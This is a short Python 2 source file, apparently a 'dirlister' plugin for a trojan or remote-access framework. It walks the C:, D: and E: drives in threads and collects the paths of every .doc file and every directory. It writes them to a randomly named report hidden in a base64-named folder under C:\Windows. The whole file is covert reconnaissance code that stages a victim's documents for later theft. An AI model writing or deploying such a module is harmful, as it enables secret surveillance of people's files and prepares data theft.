import os, datetime, random, fnmatch, threading, time

doc_path = ""
directory_path = ""
report_name = str(random.randint(1, 100000)) + '.txt'
report_path = os.path.join('C:\\Windows\\aV9sdXZfdQ==\\anVzdGtpZGRpbmc=', report_name)


def crawl_disk(disk, doc_type):

    global doc_path
    global directory_path
    global report_path

    for parent, directories, filenames in os.walk(disk):
        for filename in fnmatch.filter(filenames, "*%s" % doc_type):
            doc_path += "%s" % str(os.path.join(parent, filename))

        for directory in directories:
            directory_path += "%s" % str(os.path.join(parent, directory))

    with open(report_path, 'w') as f:
        f.write("\n" + str(datetime.datetime.now()) + "\n")
        f.write("\n" + str(doc_path) + "\n")
        f.write("\n" + str(directory_path) + "\n")

    print "Finish with disk %s" % disk
    time.sleep(random.randint(1, 3))


def crawl_disk_with_lock(disk, doc_type, lock):

    lock.acquire()
    crawl_disk(disk, doc_type)
    lock.release()


def run(**args):

    print "[*] In dirlister module."
    lock = threading.Lock()
    doc_type = '.doc'
    disk1 = 'C:\\'
    disk2 = 'D:\\'
    disk3 = 'E:\\'

    t1 = threading.Thread(target=crawl_disk_with_lock, args=(disk1, doc_type, lock,))
    t2 = threading.Thread(target=crawl_disk_with_lock, args=(disk2, doc_type, lock,))
    t3 = threading.Thread(target=crawl_disk_with_lock, args=(disk3, doc_type, lock,))

    t1.start()
    t2.start()
    t3.start()

    t1.join()
    t2.join()
    t3.join()

    return

